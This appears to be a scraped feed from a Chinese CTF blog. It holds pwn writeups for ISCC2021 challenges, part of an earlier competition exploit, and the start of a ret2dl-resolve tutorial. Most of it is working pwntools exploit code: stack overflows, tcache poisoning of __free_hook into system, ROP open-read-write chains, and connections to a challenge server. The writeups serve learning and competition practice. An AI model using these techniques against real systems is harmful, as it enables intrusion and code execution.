class="line">p.recv()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">x=p.recvline()</span><br><span class="line">y=p.recvline()</span><br><span class="line">x=decode(x)</span><br><span class="line">y=x+decode(y)</span><br><span class="line">addr=u64(y)</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">main_arena=addr<span class="number">-328</span></span><br><span class="line">malloc=main_arena<span class="number">-0x10</span></span><br><span class="line">log,info(<span class="string">'malloc:'</span>+hex(malloc))</span><br><span class="line">x=libcfind.finder(<span class="string">'__malloc_hook'</span>,malloc,num=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#free(1)</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'yyyyyyy'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#13</span></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">rdi_ret=x.libcbase+<span class="number">0x0000000000025a3b</span></span><br><span class="line">rsi_ret=x.libcbase+<span class="number">0x00000000000263e9</span></span><br><span class="line">rdx_ret=x.libcbase+<span class="number">0x00000000001018c5</span></span><br><span class="line">rbp_ret=x.libcbase+<span class="number">0x000000000004a1a7</span></span><br><span class="line">rax=x.libcbase+<span class="number">0x000000000002606c</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#13</span></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">xx=p.recvline()</span><br><span class="line">y=p.recvline()</span><br><span class="line">xx=decode(xx)</span><br><span class="line">y=xx+decode(y)</span><br><span class="line">addr=u64(y)</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">edit(<span class="number">13</span>,p64(x.dump(<span class="string">'setcontext'</span>)+<span class="number">53</span>))</span><br><span class="line">pay=p64(rdi_ret)+p64(<span class="number">0</span>)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(<span class="number">0x40</span>)+p64(x.dump(<span class="string">'read'</span>))</span><br><span class="line">pay+=p64(rdi_ret)+p64(addr)+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(rdx_ret)+p64(<span class="number">0</span>)+p64(x.dump(<span class="string">'open'</span>))<span class="comment">#open(addr,0,0)</span></span><br><span class="line">pay+=p64(rdi_ret)+p64(<span class="number">3</span>)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(<span class="number">0x40</span>)+p64(x.dump(<span class="string">'read'</span>))</span><br><span class="line">pay+=p64(rdi_ret)+p64(<span class="number">1</span>)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(<span class="number">0x40</span>)+p64(x.dump(<span class="string">'write'</span>))</span><br><span class="line">print(len(pay))</span><br><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">15</span>,pay)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'1'</span>*<span class="number">0x10</span>+p64(addr+<span class="number">0x118</span>+<span class="number">0x360</span>)+p64(rdi_ret)+<span class="string">'1'</span>*<span class="number">0x18</span>+<span class="string">'3'</span>*<span class="number">0x40</span>+<span class="string">'22222'</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'/flag.txt\x00'</span>)</span><br><span class="line"><span class="comment">#free(10)</span></span><br><span class="line"><span class="comment">#edit(10,'xxxxxxx')</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;tcl,逆向能力薄弱的我被qwb打傻了.赛后复现时,发现好多题思路是对的.卡在了逆向反推上面.但反过来,在赛后看了很多大牛的博客后,也学习到很多知识,想这段时间忙完后单独写几篇来坐坐笔记。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2021 PWN部分 WP</title>
    <link href="lexsd6.github.io/2021/05/28/ISCC2021%20PWN%20WP/"/>
    <id>lexsd6.github.io/2021/05/28/ISCC2021%20PWN%20WP/</id>
    <published>2021-05-28T01:44:14.705Z</published>
    <updated>2021-05-28T03:13:52.456Z</updated>
    
    <content type="html"><![CDATA[<p>今年终于有机会去体验iscc了，也感受到了什么是pycc的力量了。（人均全栈，233雾）<a id="more"></a></p><h2 id="M78"><a href="#M78" class="headerlink" title="M78"></a>M78</h2><p>经典的整数溢出与栈溢出.利用262来整数逃过判断,扩大栈上写入字节造成栈溢出.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./M78'</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'39.96.88.40'</span>,<span class="number">7010</span>)</span><br><span class="line">p.sendline(<span class="string">'1\x00'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please choose a building'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Please input the password'</span>)</span><br><span class="line"></span><br><span class="line">shell=<span class="string">'a'</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(e.symbols[<span class="string">'call_main'</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(shell+<span class="string">'a'</span>*(<span class="number">262</span>-len(shell)))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Box"><a href="#Box" class="headerlink" title="Box"></a>Box</h2><p>old-2.27版的堆题,限制了最多申请6个同种堆块,通过连续二次释放0x90大小的堆块.获得chunk地址.更改tcache 管理结构体,伪造其填满.再释放0x90大小的堆块获得libc基地址.再在<code>__free_hook</code>上写入system 从而getshel。l</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">l=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#l=ELF('/glibc/2.27/amd64/lib/libc.so.6')</span></span><br><span class="line"><span class="comment">#p=process('./pwn')</span></span><br><span class="line">p=remote(<span class="string">'39.96.88.40'</span>,<span class="number">7020</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size,text)</span>:</span></span><br><span class="line"><span class="comment">#p.recvuntil('&gt;&gt; ')</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input the index:'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Input the size:'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'Input data:'</span>)</span><br><span class="line">p.sendline(text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text)</span>:</span></span><br><span class="line">p.send(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input the index:'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Please input the data:'</span>)</span><br><span class="line">p.send(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input the index:'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input the index:'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Here is it :'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x90</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">chunk_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">'chunk_addr:'</span>+hex(chunk_addr))</span><br><span class="line">tache_addr=chunk_addr<span class="number">-0x260</span></span><br><span class="line">log.info(<span class="string">'tache_addr:'</span>+hex(tache_addr))</span><br><span class="line">edit(<span class="number">2</span>,p64(tache_addr+<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(2,0x40,p8(7)*0x10)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>,p8(<span class="number">7</span>)*<span class="number">0x10</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x90</span>,p8(<span class="number">6</span>)*<span class="number">0x40</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">main_arena_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span></span><br><span class="line">log.info(<span class="string">'main_arena_addr:'</span>+hex(main_arena_addr))</span><br><span class="line">base=main_arena_addr<span class="number">-0x3afc40</span></span><br><span class="line">log.info(<span class="string">'blic_base_addr:'</span>+hex(base))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">edit(<span class="number">4</span>,p8(<span class="number">6</span>)*<span class="number">0x40</span>+p64(base+l.symbols[<span class="string">'__free_hook'</span>])+p64(base+l.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x20</span>,p64(base+l.symbols[<span class="string">'system'</span>]))</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>经典的伪随机数问题，通过<code>from ctypes import *</code>的<code>CDLL</code>本地模拟随机数生成，同时利用栈溢出控制伪随机数种子。从而控制随机数产生。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'./game'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p=remote(<span class="string">'39.96.88.40'</span>,<span class="number">7040</span>)</span><br><span class="line"><span class="comment">#process('./game')</span></span><br><span class="line">c = CDLL(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">c.srand(<span class="number">1</span>) </span><br><span class="line">pay=<span class="string">'a'</span>*(<span class="number">0x24</span>)+p32(<span class="number">2</span>)+p32(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    <span class="comment">#p.recvuntil('point(1~6):')</span></span><br><span class="line">x=c.rand()</span><br><span class="line"><span class="comment">#print(x)</span></span><br><span class="line">c.srand(x)</span><br><span class="line">l=c.rand()%<span class="number">0x64</span>+<span class="number">1</span> </span><br><span class="line">print(l)</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">p.sendline(str(l))</span><br><span class="line"><span class="comment">#print(l)</span></span><br><span class="line">print(p.recv())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="full"><a href="#full" class="headerlink" title="full"></a>full</h2><p>由于没有打印信息的函数,且程序PIE是关闭的,通常就会想到ret2dl_resolve。但是做了半天发现不行，看了下保护：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure><p>发现 <code>Full RELRO</code>开着，wro……</p><p>但是查阅资料发现<a href="https://gdufs-king.github.io/2020/01/03/%E7%A5%9E%E5%A5%87%E7%9A%84gadget/" target="_blank" rel="noopener">神奇的gadget</a>一文提供了，将真实地址转移到栈上修改的思路。虽然题目中没有这个gadget但是提供了memcpy 函数。</p><p>有根据在大多数libc中read与write的symbols只一个字节不同的特性，同过将read打印到栈上修改成write从而泄露libc。</p><p>然后不知道为啥system无法执行（菜鸡推测是栈上问题），于是用orw（open-read-write）方法强行读取flag文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.arch=<span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./full'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote('39.96.88.40',7050)</span></span><br><span class="line">p=process(<span class="string">'./full'</span>)</span><br><span class="line">pppr_addr      = <span class="number">0x08048519</span>     <span class="comment"># pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop_ebp_addr   = <span class="number">0x0804851b</span>     <span class="comment"># pop ebp ; ret</span></span><br><span class="line">leave_ret_addr = <span class="number">0x080483c5</span>     <span class="comment"># leave ; ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay1=<span class="string">'12cdefghijklmn'</span>+p32(<span class="number">0x0804A040</span>+<span class="number">0x10</span>+<span class="number">0x8</span>)+p8(<span class="number">1</span>)*<span class="number">2</span></span><br><span class="line">pay1+=p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0x804a240</span>)+p32(<span class="number">0x100</span>)</span><br><span class="line">pay1+=p32(elf.symbols[<span class="string">"memcpy"</span>])+p32(pppr_addr)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">0x8049ff0</span>)+p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#栈转移</span></span><br><span class="line"></span><br><span class="line">pay1+=p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">0x1</span>)</span><br><span class="line">pay1+=p32(<span class="number">0x08048518</span>)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">0x41</span>)+p32(<span class="number">0x40</span>)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">0x08048504</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">8</span>)+<span class="string">'1111'</span>*<span class="number">4</span>+<span class="string">'2222'</span>*<span class="number">4</span></span><br><span class="line">pay1+=p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr_addr)+p32(<span class="number">0</span>)+p32(<span class="number">168</span>+<span class="number">0x0804A040</span>)+p32(<span class="number">0x100</span>)</span><br><span class="line">print(len(pay1))<span class="comment">#布局gadget，ret2csu调用write打印真实地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">'/flag.txt\x00\x00'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(p8(<span class="number">0xb0</span>))<span class="comment"># yuancheng  #经过爆破发现将read真实地址改为0xb0恰好是write</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.send(p8(0x90)) #本地</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">print(hex(write))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write)</span><br><span class="line">libcbase = write - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">log.info(<span class="string">'base:'</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">system=libcbase+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">read_0=libcbase+libc.dump(<span class="string">'open'</span>)</span><br><span class="line">write_0=libcbase+libc.dump(<span class="string">'write'</span>)</span><br><span class="line">log.info(<span class="string">'libcbase+system:'</span>+hex(system))</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(p32(read_0)+p32(pppr_addr)+p32(<span class="number">0x804a240</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr_addr)+p32(<span class="number">3</span>)+p32(<span class="number">0x804a440</span>+<span class="number">4</span>)+p32(<span class="number">0x100</span>)+p32(write_0)+<span class="string">'xxxx'</span>+p32(<span class="number">1</span>)+p32(<span class="number">0x804a440</span>+<span class="number">4</span>)+p32(<span class="number">0x100</span>))<span class="comment">#orw操作</span></span><br><span class="line"><span class="comment">#p.sendline()</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#p.sendline(p32(elf.symbols['read'])+'aaaa'+p32(0)+p32(0x804a240)+p32(0x100))</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;今年终于有机会去体验iscc了，也感受到了什么是pycc的力量了。（人均全栈，233雾）</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ret2dl-resolve利用方法小记</title>
    <link href="lexsd6.github.io/2021/05/22/ret2dl-resolve%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%8F%E8%AE%B0/"/>
    <id>lexsd6.github.io/2021/05/22/ret2dl-resolve%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%8F%E8%AE%B0/</id>
    <published>2021-05-22T14:34:50.527Z</published>
    <updated>2021-05-23T05:24:58.622Z</updated>
    
    <content type="html"><![CDATA[<p>最近在做一道题时,感觉很像ret2dl-resolve能解的,但是最后发现是自己太菜理念不清搞错解题方向ret2dl-resolve并不能解。所以写文重新温习下ret2dl-resolve,防止下次踩坑。<a id="more"></a></p><h2 id="ret2dl-resolve原理与使用条件"><a href="#ret2dl-resolve原理与使用条件" class="headerlink" title="ret2dl-resolve原理与使用条件"></a>ret2dl-resolve原理与使用条件</h2><p>ret2dl-resolve是不需要信息泄露，而是通过动态装载器来直接标识关键函数的位置并调用它们。由于ret2dl-resolve主要是针对延迟绑定来进行操作的，so它可以绕过多种包括专门为保护 ELF 数据结构不被破坏而设计的 RELRO 在内的安全缓解措施。但在依然有条件限制：</p><p>1.需要没有开启 Full RELRO 保护，换句话说要开启延迟绑定的机制，即库函数在第一次被调用时才将函数的真正地址填入 GOT 表以完成绑定。（这个是重要条件）</p><p>2.要有能被程序读取数据段上写入Elf_Sym 结构体的空间。</p><p>3.能恶意构造一个Elf_Sym 结构体。</p><h2 id="延迟绑定动态解析过程梳理"><a href="#延迟绑定动态解析过程梳理" class="headerlink" title="延迟绑定动态解析过程梳理"></a>延迟绑定动态解析过程梳理</h2><p>在一个存在延迟绑定机制程序中,库函数在第一次被调用时才将函数的真正地址填入 GOT 表以完成绑定。</p><p>这过程中牵扯到两个重要的结构体<code>Elf_Rel</code>与<code>Elf_Sym</code>.</p><p>重定位项使用 Elf_Rel 结构体来描述，存在于<code>.rep.plt</code> 段和 <code>.rel.dyn</code>段中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Word;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;       <span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;         <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int64_t</span>  Elf64_Sxword;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr    r_offset;       <span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword   r_info;         <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword  r_addend;       <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure><p>32 位程序使用 REL，而 64 位程序使用 RELA。</p><p>其中<code>r_info</code>被宏定义为按如下方式解析和插入：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(val)        ((val) &gt;&gt; 8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(val)       ((val) &amp; 0xff)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_INFO(sym, type)     (((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_SYM(i)          ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_TYPE(i)         ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_INFO(sym,type)      ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure><p>而每个符号使用<code>Elf_Sym</code>结构体来描述，存在于<code>.dynsym</code>段和<code>.symtab</code>段中，而 